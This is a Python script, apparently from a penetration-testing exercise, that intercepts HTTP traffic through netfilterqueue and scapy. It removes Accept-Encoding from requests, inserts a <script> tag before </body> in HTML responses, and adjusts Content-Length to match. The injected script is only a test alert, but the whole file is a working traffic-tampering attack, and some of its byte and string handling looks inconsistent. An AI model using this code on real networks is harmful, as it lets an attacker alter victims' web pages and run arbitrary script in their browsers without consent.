import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum  
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("\n[+] Request\n")
            load = (re.sub("Accept-Encoding:.*?"'\n\r', "", load))


        elif scapy_packet[scapy.TCP].sport == 80:
            print("\n[+] Response\n")
            #print(scapy_packet.show)
            injection_code = ("<script>alert('test');</script>")
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", bytes(load))
            if str(content_length_search) and str("text/html") in bytes(load):
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if str(load) != str(scapy_packet[scapy.Raw].load):
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()